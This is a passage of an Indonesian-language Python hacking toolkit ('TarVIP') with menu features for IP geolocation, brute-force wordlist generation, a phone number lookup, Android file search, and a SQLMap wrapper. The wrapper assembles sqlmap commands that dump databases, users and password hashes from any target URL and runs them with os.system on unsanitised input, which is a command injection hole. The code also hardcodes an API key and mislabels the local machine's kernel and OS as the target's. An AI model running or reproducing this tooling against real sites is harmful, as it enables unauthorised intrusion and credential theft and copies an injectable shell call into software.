        print(f"\n{LIME}[✓] {mode.title()} berhasil sebanyak 100x! File tersimpan ulang: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[X] Gagal {mode} file: {e}{RESET}")

    input(f"\n{YELLOW}Tekan Enter untuk kembali ke menu...{RESET}")

def fitur_2():
    clear()
    print(f"{CYAN}Website Intelligence Scanner{RESET}")

    url = input(f"{YELLOW}Masukkan URL (contoh: https://example.com): {RESET}").strip()
    if not (url.startswith("http://") or url.startswith("https://")):
        print(f"{RED}URL tidak valid! Harus diawali http:// atau https://{RESET}")
        time.sleep(2)
        return

    try:
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
    except Exception as e:
        print(f"{RED}Gagal mendapatkan IP dari URL! {e}{RESET}")
        time.sleep(2)
        return

    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()

        if res['status'] != 'success':
            print(f"{RED}Gagal mengambil data IP!{RESET}")
            time.sleep(2)
            return

        data = {
            "IP Address": ip,
            "Hostname": domain,
            "IP Range / ASN": res.get('as', 'N/A'),
            "ISP": res.get('isp', 'N/A'),
            "Organization": res.get('org', 'N/A'),
            "Country": res.get('country', 'N/A'),
            "Region": res.get('regionName', 'N/A'),
            "City": res.get('city', 'N/A'),
            "Postal Code": res.get('zip', 'N/A'),
            "Timezone": res.get('timezone', 'N/A'),
            "Coordinates (Lat, Long)": f"{res.get('lat', 'N/A')}, {res.get('lon', 'N/A')}",
            "Local Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "Kernel Version": os.uname().release,
            "Operating System": os.uname().sysname,
        }

        # Hitung lebar label dan value
        label_width = max(len(label) for label in data.keys()) + 2
        value_width = max(len(str(value)) for value in data.values()) + 2

        total_width = label_width + value_width + 5

        # Header
        print(f"\n{GREEN}Informasi Website untuk: {BLUE}{domain}{RESET}\n")
        print(f"{CYAN}┌{'─' * label_width}┬{'─' * value_width}┐{RESET}")
        for label, value in data.items():
            print(f"{CYAN}│ {YELLOW}{label.ljust(label_width - 2)} {CYAN}│ {GREEN}{str(value).ljust(value_width - 2)} {CYAN}│{RESET}")
        print(f"{CYAN}└{'─' * label_width}┴{'─' * value_width}┘{RESET}")

        input(f"\n{YELLOW}Tekan Enter untuk kembali...{RESET}")

    except Exception as e:
        print(f"{RED}Terjadi kesalahan: {e}{RESET}")
        time.sleep(2)

import itertools
import platform

def fitur_3():
    clear()
    print(f"{CYAN}Wordlist Generator - Brute Force Universal{RESET}\n")

    digit_items = [
        {"no": 1, "digit": "1 Digit", "desc": "Kombinasi semua karakter, 1 digit"},
        {"no": 2, "digit": "2 Digit", "desc": "Kombinasi 2 karakter"},
        {"no": 3, "digit": "3 Digit", "desc": "Kombinasi 3 karakter"},
        {"no": 4, "digit": "4 Digit", "desc": "Kombinasi 4 karakter"},
        {"no": 5, "digit": "5 Digit", "desc": "Kombinasi 5 karakter"},
        {"no": 6, "digit": "6 Digit", "desc": "Kombinasi 6 karakter"},
    ]

    col1, col2, col3 = 6, 12, 36
    print(f"{CYAN}╔{'═' * (col1 + 2)}╦{'═' * (col2 + 2)}╦{'═' * (col3 + 2)}╗{RESET}")
    print(f"{CYAN}║ {YELLOW}{'No'.ljust(col1)} {CYAN}║ {BLUE}{'Digit'.ljust(col2)} {CYAN}║ {GREEN}{'Keterangan'.ljust(col3)} {CYAN}║{RESET}")
    print(f"{CYAN}╠{'═' * (col1 + 2)}╬{'═' * (col2 + 2)}╬{'═' * (col3 + 2)}╣{RESET}")
    for item in digit_items:
        print(f"{CYAN}║ {RED}{str(item['no']).ljust(col1)} {CYAN}║ {BLUE}{item['digit'].ljust(col2)} {CYAN}║ {GREEN}{item['desc'].ljust(col3)} {CYAN}║{RESET}")
    print(f"{CYAN}╚{'═' * (col1 + 2)}╩{'═' * (col2 + 2)}╩{'═' * (col3 + 2)}╝{RESET}")

    try:
        pilihan = int(input(f"\n{YELLOW}Pilih panjang digit (1–6): {RESET}"))
        if not 1 <= pilihan <= 6:
            print(f"{RED}Pilihan tidak valid!{RESET}")
            time.sleep(2)
            return
    except:
        print(f"{RED}Input harus angka!{RESET}")
        time.sleep(2)
        return

    panjang = pilihan
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    kombinasi = len(charset) ** panjang
    estimasi_ukuran = (kombinasi * (panjang + 1)) / (1024 ** 3)  # dalam GB
    ram_min = "512 MB" if panjang <= 3 else "2–8 GB"
    penyimpanan_min = f"{estimasi_ukuran:.2f} GB"

    # Deteksi platform
    sysname = os.uname().sysname
    platform_pengguna = "Android (HP)" if "Android" in sysname else "Linux/Unix (PC)"

    print(f"\n{CYAN}[!] Estimasi Wordlist untuk {panjang} digit:{RESET}")
    print(f"{YELLOW}- Jumlah kombinasi     : {LIME}{kombinasi:,}{RESET}")
    print(f"{YELLOW}- Estimasi ukuran file : {LIME}{penyimpanan_min}{RESET}")
    print(f"{YELLOW}- RAM minimum          : {LIME}{ram_min}{RESET}")
    print(f"{YELLOW}- Perangkat Anda       : {LIME}{platform_pengguna}{RESET}")

    if sysname.lower().startswith("android") and panjang > 4:
        print(f"{RED}[!] PERINGATAN: Ukuran terlalu besar, HP Anda bisa crash!{RESET}")

    konfirmasi = input(f"\n{YELLOW}Lanjutkan pembuatan wordlist ini? (y/n): {RESET}").strip().lower()
    if konfirmasi != 'y':
        print(f"{RED}Dibatalkan oleh pengguna.{RESET}")
        time.sleep(1.5)
        return

    filename = f"wordlist_{panjang}digit.txt"
    print(f"{CYAN}Membuat wordlist... Tunggu sebentar...{RESET}")

    try:
        with open(filename, "w") as f:
            for item in itertools.product(charset, repeat=panjang):
                f.write("".join(item) + "\n")
        print(f"{GREEN}Berhasil! Wordlist disimpan sebagai: {BLUE}{filename}{RESET}")
    except Exception as e:
        print(f"{RED}Gagal membuat wordlist: {e}{RESET}")

    input(f"\n{YELLOW}Tekan Enter untuk kembali...{RESET}")

def fitur_4():
    import json

    FILE_IP = "lamp_ips.json"
    clear()
    print(f"{CYAN}Smart Lamp Controller - IP Manual Mode{RESET}\n")
    print(f"{YELLOW}[!] Pastikan kamu sudah cek IP lampu menggunakan aplikasi Fing.{RESET}")
    print(f"{YELLOW}[!] Tekan ENTER untuk memilih IP yang sudah tersimpan.{RESET}")

    # Load IP list
    try:
        with open(FILE_IP, "r") as f:
            ip_list = json.load(f)
    except:
        ip_list = []

    ip_input = input(f"\n{YELLOW}Masukkan IP Address lampu (atau tekan ENTER): {RESET}").strip()

    if ip_input:
        if ip_input not in ip_list:
            ip_list.append(ip_input)
            with open(FILE_IP, "w") as f:
                json.dump(ip_list, f)
        target_ip = ip_input
    else:
        if not ip_list:
            print(f"{RED}Belum ada IP lampu yang tersimpan.{RESET}")
            time.sleep(2)
            return

        # Tampilkan tabel IP tersimpan
        print(f"\n{CYAN}Daftar IP Lampu Tersimpan:{RESET}")
        nomor_width = 4
        ip_width = max(len(ip) for ip in ip_list) + 2
        garis = "─"
        print(f"{CYAN}┌{garis * nomor_width}┬{garis * ip_width}┐{RESET}")
        print(f"{CYAN}│ {YELLOW}No{' ' * (nomor_width - 2)}{CYAN}│ {BLUE}IP Address{' ' * (ip_width - 11)}{CYAN}│{RESET}")
        print(f"{CYAN}├{garis * nomor_width}┼{garis * ip_width}┤{RESET}")
        for i, ip in enumerate(ip_list, 1):
            print(f"{CYAN}│ {RED}{str(i).ljust(nomor_width - 1)}{CYAN}│ {GREEN}{ip.ljust(ip_width - 1)}{CYAN}│{RESET}")
        print(f"{CYAN}└{garis * nomor_width}┴{garis * ip_width}┘{RESET}")

        try:
            pilih = int(input(f"\n{YELLOW}Pilih nomor IP: {RESET}"))
            target_ip = ip_list[pilih - 1]
        except:
            print(f"{RED}Pilihan tidak valid.{RESET}")
            return

    print(f"\n{CYAN}Terkoneksi ke lampu di {GREEN}{target_ip}{RESET}")

    # Menu kontrol lampu
    print(f"\n{YELLOW}Pilih aksi:{RESET}")
    print(f"{CYAN}1.{RESET} Nyalakan lampu")
    print(f"{CYAN}2.{RESET} Matikan lampu")
    print(f"{CYAN}3.{RESET} Ubah warna lampu")
    print(f"{CYAN}4.{RESET} Atur kecerahan (1–100%)\n")

    aksi = input(f"{YELLOW}Masukkan pilihan (1-4): {RESET}").strip()

    perintah = ""
    if aksi == "1":
        perintah = "ON"
    elif aksi == "2":
        perintah = "OFF"
    elif aksi == "3":
        warna = input(f"{YELLOW}Masukkan warna (contoh: red, green, blue): {RESET}").strip().lower()
        warna_valid = ["red", "green", "blue", "yellow", "white", "purple", "cyan"]
        if warna not in warna_valid:
            print(f"{RED}Warna tidak valid!{RESET}")
            return
        perintah = f"COLOR:{warna}"
    elif aksi == "4":
        try:
            level = int(input(f"{YELLOW}Masukkan tingkat kecerahan (1–100): {RESET}"))
            if not (1 <= level <= 100):
                raise ValueError
            perintah = f"BRIGHTNESS:{level}"
        except:
            print(f"{RED}Nilai tidak valid!{RESET}")
            return
    else:
        print(f"{RED}Pilihan tidak valid!{RESET}")
        return

    # Kirim perintah ke lampu
    print(f"\n{CYAN}Mengirim perintah: {GREEN}{perintah}{RESET}")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, 80))  # ubah port jika lampu pakai port lain
        s.send(perintah.encode())
        s.close()
        print(f"{LIME}Perintah berhasil dikirim ke lampu!{RESET}")
    except Exception as e:
        print(f"{RED}Gagal mengirim perintah: {e}{RESET}")

    input(f"\n{YELLOW}Tekan Enter untuk kembali...{RESET}")

def fitur_5():
    import re
    import requests
    clear()
    print(f"{CYAN}📱 Phone Number Intelligence Lookup (via NumVerify){RESET}\n")

    nomor = input(f"{YELLOW}Masukkan nomor telepon (contoh: +6281234567890): {RESET}").strip()

    if not nomor.startswith("+") or not re.match(r'^\+\d{7,16}$', nomor):
        print(f"{RED}Format salah! Gunakan format internasional (awalan +).{RESET}")
        time.sleep(2)
        return

    print(f"{CYAN}\n🔍 Mencari informasi untuk {LIME}{nomor}{CYAN}...{RESET}")
    time.sleep(1)

    try:
        api_key = "0524af787cff8e5c600d356af11b48d2"
        url = f"http://apilayer.net/api/validate?access_key={api_key}&number={nomor}&format=1"
        res = requests.get(url).json()

        if not res.get("valid"):
            print(f"{RED}🚫 Nomor tidak valid atau tidak ditemukan.{RESET}")
            time.sleep(2)
            return

        data = {
            "Valid": str(res.get("valid")),
            "Number": res.get("number", ""),
            "Local Format": res.get("local_format", ""),
            "International Format": res.get("international_format", ""),
            "Country Prefix": res.get("country_prefix", ""),
            "Country Code": res.get("country_code", ""),
            "Country Name": res.get("country_name", ""),
            "Location": res.get("location", ""),
            "Carrier": res.get("carrier", ""),
            "Line Type": res.get("line_type", ""),
        }

        # Hitung lebar kolom otomatis
        col1_width = max(len("Kategori"), max(len(k) for k in data)) + 2
        col2_width = max(len("Informasi"), max(len(str(v)) for v in data.values())) + 2

        # Border karakter gaya print_menu
        h = "═"
        v = "║"
        tl, tm, tr = "╔", "╦", "╗"
        ml, mm, mr = "╠", "╬", "╣"
        bl, bm, br = "╚", "╩", "╝"

        # Header
        print(f"\n{CYAN}{tl}{h * col1_width}{tm}{h * col2_width}{tr}{RESET}")
        print(f"{CYAN}{v} {YELLOW}{'Kategori'.ljust(col1_width - 1)}{CYAN}{v} {GREEN}{'Informasi'.ljust(col2_width - 1)}{CYAN}{v}{RESET}")
        print(f"{CYAN}{ml}{h * col1_width}{mm}{h * col2_width}{mr}{RESET}")

        # Isi
        for k, vval in data.items():
            print(f"{CYAN}{v} {BLUE}{k.ljust(col1_width - 1)}{CYAN}{v} {LIME}{str(vval).ljust(col2_width - 1)}{CYAN}{v}{RESET}")

        # Footer
        print(f"{CYAN}{bl}{h * col1_width}{bm}{h * col2_width}{br}{RESET}")

    except Exception as e:
        print(f"{RED}⚠️ Gagal mengambil data: {e}{RESET}")
        time.sleep(2)

    input(f"\n{YELLOW}Tekan Enter untuk kembali ke menu utama...{RESET}")

def fitur_6():
    import os
    import shutil

    clear()
    print(f"{CYAN}Advanced File Finder - Deep Recursive Search{RESET}\n")

    keyword = input(f"{YELLOW}Masukkan nama file yang ingin dicari (contoh: Tarzan): {RESET}").strip().lower()
    if not keyword:
        print(f"{RED}Kata kunci tidak boleh kosong.{RESET}")
        time.sleep(2)
        return

    root_dir = "/storage/emulated/0"
    if not os.path.exists(root_dir):
        print(f"{RED}Penyimpanan utama tidak ditemukan!{RESET}")
        return

    print(f"\n{CYAN}Menelusuri seluruh folder di: {LIME}{root_dir}{CYAN}...\n{RESET}")
    time.sleep(1)

    hasil = []
    for current_root, dirs, files in os.walk(root_dir, topdown=True):
        dirs[:] = [d for d in dirs if not d.startswith(".")]  # opsional: skip hidden dirs
        for file in files:
            if keyword in file.lower():
                full_path = os.path.join(current_root, file)
                hasil.append(full_path)

    if not hasil:
        print(f"{RED}Tidak ditemukan file yang mengandung kata '{keyword}' dalam nama file.{RESET}")
        return

    # Siapkan data tabel
    file_items = [{"no": i + 1, "path": p} for i, p in enumerate(hasil)]

    # Hitung lebar kolom otomatis
    col1_width = max(len("No"), len(str(len(file_items)))) + 2
    col2_width = max(len("File Path"), max(len(item["path"]) for item in file_items)) + 2

    # Karakter tabel
    h = "─"
    v = "│"
    tl, tm, tr = "┌", "┬", "┐"
    ml, mm, mr = "├", "┼", "┤"
    bl, bm, br = "└", "┴", "┘"

    # Header tabel
    print(f"{CYAN}{tl}{h * col1_width}{tm}{h * col2_width}{tr}{RESET}")
    print(f"{CYAN}{v} {YELLOW}{'No'.ljust(col1_width - 1)}{CYAN}{v} {GREEN}{'File Path'.ljust(col2_width - 1)}{CYAN}{v}{RESET}")
    print(f"{CYAN}{ml}{h * col1_width}{mm}{h * col2_width}{mr}{RESET}")

    for item in file_items:
        print(f"{CYAN}{v} {RED}{str(item['no']).ljust(col1_width - 1)}{CYAN}{v} {BLUE}{item['path'].ljust(col2_width - 1)}{CYAN}{v}{RESET}")

    print(f"{CYAN}{bl}{h * col1_width}{bm}{h * col2_width}{br}{RESET}")

    try:
        pilih = int(input(f"\n{YELLOW}Pilih nomor file yang ingin disalin ke folder HOME Anda: {RESET}"))
        if not (1 <= pilih <= len(file_items)):
            print(f"{RED}Nomor tidak valid.{RESET}")
            return

        path_terpilih = file_items[pilih - 1]["path"]
        print(f"\n{CYAN}File yang dipilih:{RESET}\n{LIME}{path_terpilih}{RESET}")

        konfirmasi = input(f"\n{YELLOW}Salin file ini ke folder HOME Anda (~/)? [y/n]: {RESET}").strip().lower()
        if konfirmasi == "y":
            tujuan = os.path.join(os.environ["HOME"], os.path.basename(path_terpilih))
            try:
                shutil.copy(path_terpilih, tujuan)
                print(f"{GREEN}File berhasil disalin ke: {BLUE}{tujuan}{RESET}")
            except Exception as e:
                print(f"{RED}Gagal menyalin file: {e}{RESET}")
        else:
            print(f"{CYAN}Lokasi lengkap file:{RESET} {LIME}{path_terpilih}{RESET}")

    except:
        print(f"{RED}Input tidak valid atau terjadi kesalahan.{RESET}")

    input(f"\n{YELLOW}Tekan Enter untuk kembali...{RESET}")

def fitur_7():
    import shlex

    clear()
    print(f"{CYAN}{'═'*70}{RESET}")
    print(f"{BLUE}{' SQLMap Ultimate Interface - Versi Profesional ':^70}{RESET}")
    print(f"{CYAN}{'═'*70}{RESET}\n")

    # Input utama
    url = input(f"{YELLOW}➤ Target URL (contoh: https://target.com/index.php?id=1):\n{RESET}> ").strip()
    if not url:
        print(f"{RED}URL tidak boleh kosong.{RESET}")
        time.sleep(2)
        return

    # Pilihan lanjutan
    level = input(f"\n{YELLOW}➤ Level [1-5, default 1]: {RESET}") or "1"
    risk = input(f"{YELLOW}➤ Risiko [1-3, default 1]: {RESET}") or "1"
    tech = input(f"{YELLOW}➤ Teknik (BEUSTQ) [kosong=semua]: {RESET}")
    proxy = input(f"{YELLOW}➤ Proxy (contoh: http://127.0.0.1:8080) [opsional]: {RESET}")
    cookie = input(f"{YELLOW}➤ Cookie [opsional]: {RESET}")
    ua = input(f"{YELLOW}➤ User-Agent [opsional]: {RESET}")
    tamper = input(f"{YELLOW}➤ Tamper scripts (contoh: between,randomcase) [opsional]: {RESET}")

    # Opsi fitur
    print(f"\n{CYAN}Opsi Tambahan:{RESET}")
    dump_db = input(f"{YELLOW}- Tampilkan database target? (y/n): {RESET}").strip().lower() == 'y'
    dump_table = input(f"{YELLOW}- Dump tabel? (y/n): {RESET}").strip().lower() == 'y'
    get_banner = input(f"{YELLOW}- Tampilkan banner DBMS? (y/n): {RESET}").strip().lower() == 'y'
    get_users = input(f"{YELLOW}- Tampilkan daftar user? (y/n): {RESET}").strip().lower() == 'y'
    get_passwords = input(f"{YELLOW}- Dump password user? (y/n): {RESET}").strip().lower() == 'y'

    # Bangun command dasar
    cmd = f"python sqlmap.py -u \"{url}\" --batch --level={level} --risk={risk}"
    if tech: cmd += f" --technique={tech}"
    if proxy: cmd += f" --proxy=\"{proxy}\""
    if cookie: cmd += f" --cookie=\"{cookie}\""
    if ua: cmd += f" --user-agent=\"{ua}\""
    if tamper: cmd += f" --tamper=\"{tamper}\""

    if get_banner: cmd += " --banner"
    if get_users: cmd += " --users"
    if get_passwords: cmd += " --passwords"
    if dump_db: cmd += " --dbs"
    if dump_table:
        db = input(f"{YELLOW}  ↳ Nama database: {RESET}").strip()
        table = input(f"{YELLOW}  ↳ Nama tabel: {RESET}").strip()
        columns = input(f"{YELLOW}  ↳ Kolom (opsional, pisah koma): {RESET}").strip()
        if db and table:
            cmd += f" -D \"{db}\" -T \"{table}\" --dump"
            if columns:
                cmd += f" -C \"{columns}\""

    # Tampilkan perintah akhir
    print(f"\n{CYAN}{'═'*70}")
    print(f"{LIME}Perintah yang akan dijalankan:{RESET}")
    print(f"{BLUE}{cmd}{RESET}")
    print(f"{CYAN}{'═'*70}{RESET}\n")

    konfirmasi = input(f"{YELLOW}➤ Jalankan perintah ini? (y/n): {RESET}").strip().lower()
    if konfirmasi != 'y':
        print(f"{RED}Dibatalkan oleh pengguna.{RESET}")
        return

    print(f"\n{CYAN}▶ Menjalankan SQLMap...{RESET}\n")
    time.sleep(1)

    os.system(cmd)

    input(f"\n{YELLOW}Tekan Enter untuk kembali ke menu utama...{RESET}")

def main():
    while True:
        clear()
        show_greeting()
        print_logo()
        print_menu()

        cmd = input(f"{RED}Tar{BLUE}VIP{LIME}? {RESET}")
        handle_command(cmd)

if __name__ == "__main__":
    main()


